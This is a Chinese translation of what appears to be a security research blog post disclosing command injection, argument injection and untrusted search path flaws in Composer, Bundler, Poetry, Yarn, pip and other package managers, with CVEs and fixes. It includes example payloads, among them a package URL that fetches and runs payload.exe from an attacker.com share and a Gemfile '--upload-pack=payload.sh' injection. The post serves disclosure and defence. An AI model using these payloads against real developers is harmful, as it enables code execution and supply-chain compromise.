开发人员是网络犯罪分子的一个有吸引力的目标，因为他们可以访问公司的核心知识产权资产：源代码。入侵它们允许攻击者进行间谍活动或将恶意代码嵌入公司的产品中。这甚至可以用来发动供应链攻击。

现代软件开发和几乎所有编程语言生态系统的一个组成部分都是包管理器。它们有助于管理和下载第 3
方依赖项，因此开发人员必须确保这些依赖项不包含恶意代码，因为它们会嵌入到他们构建的产品中。但是，管理依赖项的行为通常不被视为具有潜在风险的操作，尤其是在启用安全选项时。

为了帮助保护开发者生态系统，我们的研究人员开始研究开发者工具，这些工具可能会被攻击者作为攻击目标来破坏开发者机器。
**在本文中，我们讨论了在一些最流行的包管理器中发现的漏洞。** 下周的文章将描述终端和广泛使用的代码编辑器中使用的 Git 集成中的漏洞。

##  **它如何影响你**

作为我们研究的结果，我们在以下主流的包管理器中发现了漏洞：

> Composer 1.x < 1.10.23 和 2.x < 2.1.9（已修复，CVE-2021-41116，1 未修复）
>
> Bundler < 2.2.33（已修复，CVE-2021-43809）
>
> Bower < 1.8.13（已修复，CVE-2021-43796）
>
> 诗歌 < 1.1.9（已修复，CVE 待定）
>
> Yarn < 1.22.13（已修复，CVE 待定）
>
> pnpm < 6.15.1（已修复，CVE 待定）
>
> 点（不固定）
>
> Pipenv（未修复）

我们描述的攻击可能发生在两种不同的场景中。在这两种情况下，受害者都需要使用上述软件包管理器之一处理恶意文件或软件包。这意味着无法从远程直接针对开发人员机器发起攻击，并且需要诱骗开发人员加载格式错误的文件。但是，您能否始终了解并信任您从
Internet 或公司内部存储库中使用的所有软件包的所有者？

在第一种情况下，攻击者会发布一个恶意包，然后让受害者使用带有该包名的 Composer 浏览命令。例如，这可能通过社会工程、拼写错误或依赖混淆发生。我们在
Composer 中发现了属于这种情况的命令注入漏洞。恶意包过去曾被用于其他类型的攻击，例如流行的 JavaScript 包“ua-parser-js”去年就[感染了恶意代码](https://www.securityweek.com/critical-severity-warning-malware-embedded-popular-javascript-library)。

第二种情况要求受害者首先下载攻击者控制的文件，然后对这些文件使用易受攻击的包管理器之一。这需要攻击者使用社会工程或将恶意文件偷偷放入受害者信任的代码库中。我们发现了属于这种情况的参数注入和不受信任的搜索路径问题。2021
年，类似的攻击向量已被用于针对安全研究人员。攻击者以希望合作开展项目为借口，使用虚假 Twitter 帐户将 Visual Studio
项目发送给受害者，这些项目在打开时会执行恶意软件。

如果这些攻击中的任何一个成功，攻击者就可以在受害者的机器上运行任何命令。例如，他们可以窃取或修改敏感数据，例如源代码或访问令牌，从而允许攻击者将后门或恶意软件放入代码中或感染受害者可以访问的其他系统。

##  **技术细节**

在以下部分中，我们将解释在几个最流行的包管理器中发现的 3
种不同类型的漏洞；我们相信这些类型在包管理器中很普遍，并且这项研究可以应用于任何新目标。我们从发布恶意程序包的攻击者可以使用的命令注入漏洞开始。然后我们看一下参数注入和不受信任的搜索路径漏洞，这些漏洞可用于诱骗受害者执行恶意代码。

### Composer 中的命令注入

Composer 是 PHP
生态系统中领先的包管理器，是一个命令行应用程序，它实现了几个子命令，例如status、install和remove。开发人员可以使用另一个子命令browse来轻松打开包的源代码和文档。它需要一个包名作为其唯一参数，然后将获取该包的元数据并打开设置为包主页的
URL。这是按如下方式实现的：

[src/Composer/Command/HomeCommand.php：](https://github.com/composer/composer/blob/c44fbbc3ebdfd5b06f092c7de3e27936385bd3e1/src/Composer/Command/HomeCommand.php#L100-L119)

    
    
    // [...]
    $support = $package->getSupport();
    $url = isset($support['source']) ? $support['source'] : $package->getSourceUrl();
    // [...]
    
    if (!$url || !filter_var($url, FILTER_VALIDATE_URL)) { // ← [1]
        return false;
    }
    
    // [...]
    $this->openBrowser($url); // ← [2]
    

检查包的源字段是否为有效 URL（在[1]处），然后在浏览器中打开（在[2]处）。打开机制取决于操作系统，并在前一个函数的下方实现：

当操作系统是 Windows 时，命令是start "web" explorer ""。URL
在插入命令字符串之前被转义，但转义函数已经在值周围添加了双引号。这会导致 URL 的双重包装，从而产生类似start "web" explorer
""http://example.com/""的命令。这导致该值在命令字符串中根本不会被转义，从而可以插入更多命令，这称为命令注入漏洞。

要利用这一点，攻击者必须发布包含源 URL 的包，例如：  
http ://example.com/&\attacker.com\Public\payload.exe

该值满足作为有效 URL 的条件，至少根据 PHP
的FILTER_VALIDATE_URL，但是当受害者使用带有恶意包名称的浏览命令时，会导致任意代码执行。假设攻击者的包名为bad-pkg，他们使用上述源
URL 将其发布到 Composer 注册表。现在，如果任何用户运行composer browse bad-pkg，example.com将在他们的浏览器中打开，但也会在后台静默地从attacker.com的公共 SMB
共享中下载payload.exe并执行。这为攻击者提供了对受害者机器的访问权限以及发动进一步攻击的能力。

###  **Bundler 和 Poetry 中的参数注入**

先前的漏洞是由于从用户输入中不安全地创建命令字符串造成的，这已被证明是一种容易出错的方法。通常更安全的替代方法是使用参数数组而不是命令字符串，但这样做仍然可能出错，正如我们将在本节中学习的那样。

当包管理器尝试下载一个包时，它可能来自多个可能的来源。通常的来源是包管理器的本地注册表。但大多数包管理器还支持从本地文件路径或 Git
存储库安装包。后者通常通过调用一系列 Git 命令来实现，例如git clone。

Git 是一个复杂的命令行工具，有很多选项，所以就有了Argument
Injections的可能性。当参数之一应该是位置参数时，就会发生这种情况，但攻击者可以将其变成可选参数。命令行应用程序通过检查参数是否以破折号 ( -)开头来确定参数是位置的还是非位置的。

让我们以 Ruby 生态系统中的包管理器 Bundler 为例。由于它使用用户控制的参数调用 Git 命令的方式，它很容易受到攻击：

    
    
    def checkout
      # [...]
      configured_uri = configured_uri_for(uri).to_s
      unless path.exist?
        SharedHelpers.filesystem_access(path.dirname) do |p|
          FileUtils.mkdir_p(p)
        end
        git_retry "clone", configured_uri, path.to_s, "--bare", "--no-hardlinks", "--quiet"
        return unless extra_ref
      end
      # [...]
    end
    

git_retry函数本质上是使用提供的参数运行 Git
命令。为了让这个例子更简单，我们将在最后省略三个可选参数。checkout函数的正常执行会导致执行如下的 OS 命令：

    
    
    exec("git", ["clone", "https://myrepo.com", "./destination-dir/"])
    

Git
遍历这个参数列表，发现它们都不是以破折号开头，假设它们都是位置参数，并将https://myrepo.com上的存储库克隆到目录./destination-dir/中。

但是uri的值来自 Gemfile，因此攻击者可能会通过创建如下所示的 Gemfile 来滥用它：

    
    
    gem 'poc', git: '--upload-pack=payload.sh'
    

因此，uri是--upload-pack=payload.sh，这将导致git_retry运行这个 Git 命令：

    
    
    exec("git", ["clone", "--upload-pack=payload.sh", "./destination-dir/"])
    

Git 将其理解为“将存储库克隆到本地路径./destination-dir/，但使用payload.sh作为上传包选项”。这将导致payload.sh或任何其他指定的命令的执行。

Python 生态系统中的包管理器 Poetry
也容易受到相同类型的攻击。许多其他的包管理器实现了类似的东西，但在我们的研究中由于细微的差异而没有发现它们是可利用的。

 **Yarn、Pip、Composer 等中的不可信搜索路径**

同样，即使通过使用参数列表而不是命令字符串来避免先前的漏洞，并确保不会注入不需要的参数，还有另一件事可能会出错。对于此类漏洞，我们首先要了解 Windows
与其他操作系统在将命令名称解析为正确的可执行文件的方式上的区别。

当使用相对或绝对路径执行命令时，无需解析任何内容，因为路径是已知的。但是，如果命令只是一个名称，那么操作系统的工作就是查找并运行与该名称匹配的正确二进制文件。在所有主要操作系统上，可能的位置都在PATH环境变量中设置。它包含系统将在其中查找与命令名称匹配的可执行文件的所有路径。这种行为在所有主要操作系统中都是一致的，但
Windows 会考虑一个额外的位置：当前工作目录。它将在所有其他位置之前在那里查找可执行文件，然后只使用PATH 。

例如，如果当前目录中有一个名为notepad.exe的文件，并且用户启动了一个将执行命令notepad
%localappdata%\Temp\test.txt的程序，则将执行本地notepad.exe而不是常规记事本可执行文件位于C:\Windows\system32\notepad.exe。

这是许多开发人员不知道的 Windows
怪癖，过去它导致了许多漏洞。每当程序按名称执行命令但不确保PATH和当前目录中的文件是安全的时，它就会创建一个不受信任的搜索路径(CWE-426) 漏洞。

如前所述，许多包管理器允许引用来自 Git 存储库而不是其本地注册表的包。因为检查 Git
存储库需要一些复杂的工作，所以这些包管理器不会自己实现这些，而只是运行将为它们完成工作的 Git 命令。

查看 JavaScript 生态系统中流行的包管理器 Yarn，从 Git 存储库声明依赖项将导致package.json文件如下所示：

    
    
    {
      "dependencies": {
        "example": "git+https://github.com/example/example"
      }
    }
    

运行yarn install时，Yarn 会通过 Git 从 GitHub下载示例包。在内部，它将为此使用命令git clone git+
https://github.com/example/example。请注意，Git
是按名称调用的，而不是使用相对或绝对路径，因此当在包含不受信任文件的目录中执行命令时，这会产生不受信任的搜索路径漏洞。如果目录中有git.exe文件，那么它将被执行而不是安装的
Git，从而导致执行恶意代码。

当然，处理不受信任的文件总是很危险的，即使用户格外小心。通常，Yarn 的命令行选项--ignore-scripts会阻止第三方代码的执行，但它无助于阻止此类攻击。来自 Git 存储库的依赖项也可以是完全合法的，因为重要的是通过 Git
获取它，而不是它的内容是什么。

几个流行的包管理器受此影响，即 Yarn、pnpm、Bower、Poetry、Composer、pip 和 pipenv。Composer
的维护人员决定不解决此问题，因为他们声明这超出了他们的威胁模型。Pip 和 Pipenv
也选择不解决这个问题，因为根据他们的说法，攻击者可以通过其他几种方式在相同的攻击场景中获得代码执行。

###  **修补**

为避免命令注入漏洞，我们建议仅在确实需要时才使用命令字符串。尝试运行带有参数列表的命令。如果您确实需要使用命令字符串，请依赖内置或受信任的第三方转义函数，而不是编写自己的转义函数。确保不会像
Composer 那样发生双重包装。在 PHP 中，在命令字符串中转义 shell 参数的正确方法是使用escapeshellarg函数：

    
    
    $process->execute('start "web" explorer ' . escapeshellarg($url), $output);
    

为避免参数注入，请确保没有参数以破折号 ( - )
开头。在实际执行命令之前执行此操作，并确保在检查和执行之间不会进一步修改参数的值，因为这在过去导致了绕过。请注意，某些 Windows 应用程序使用斜杠 (
/ ) 而不是破折号来标记可选参数的开头，因此请确保您知道您运行的命令如何解释参数并相应地调整任何检查。

另一种方法是在用户控制的参数之前插入--作为单个参数。这充当分隔符并告诉程序不应将任何后续参数视为可选参数。由于这是在 POSIX
标准中定义的，因此请确保该命令符合 POSIX 标准，否则可能无法正常工作。对于 Bundler，维护人员使用它来修复漏洞：

    
    
    git_retry "clone", "--bare", "--no-hardlinks", "--quiet", "--", configured_uri, path.to_s
    

为避免Windows 上的不受信任的搜索路径漏洞，如果可能，最简单的方法是在安全目录中运行命令。这就是 Rust 的包管理器 Cargo 检查来自 Git
存储库的依赖项的方式。如果命令必须在当前目录中运行，您应该首先以安全的方式解析匹配的可执行文件的路径，然后使用该路径运行命令。

例如，Yarn
通过使用where命令（始终位于%WINDIR%\System32\where.exe来解析命令）修复了他们的漏洞。他们通过将一组可能的位置限制为PATH环境变量中定义的位置来排除当前目录。这是一种实现方式：

    
    
    const { join } = require('path');
    const { execFile } = require('child_process');
    
    const WHERE_PATH = join(process.env.WINDIR, 'System32', 'where.exe');
    
    async function resolveExecutableOnWindows(name) {
      return new Promise((resolve, reject) => {
        execFile(WHERE_PATH, [`$PATH:${name}`], (error, stdout, stderr) => {
          if (error) {
            return reject(error);
          }
          const [ firstMatch ] = stdout.split('\r\n');
          resolve(firstMatch);
        });
      });
    }
    

## **总结**

在这篇文章中，我们介绍了流行的包管理器中的 3
种类型的漏洞。我们举例说明了攻击者如何使用它们来破坏开发者机器，我们用代码示例解释了潜在问题，并就如何避免类似问题提出了建议。

请记住定期更新所有工具，并在处理来自未知来源的文件时保持谨慎。我们强烈建议不要在不受信任的代码库上使用包管理器，即使具有禁用脚本执行等安全功能。将所有第三方代码和文件视为危险的，如果您确实需要处理它们，我们建议在一次性虚拟机中这样做。

我们要感谢我们报告问题的所有项目的维护者。他们迅速回应了我们的建议并修复了漏洞，或者花时间与我们讨论他们为什么不将某些东西视为漏洞。

###  **参考**

> [PHP 供应链攻击 Composer](https://blog.sonarsource.com/php-supply-chain-attack-> on-composer)
>
> [特工 008：链接漏洞以破坏 GoCD](https://blog.sonarsource.com/gocd-vulnerability-chain)
>
> [Etherpad 1.8.13 - 代码执行漏洞﻿](https://blog.sonarsource.com/etherpad-code-> execution-vulnerabilities)

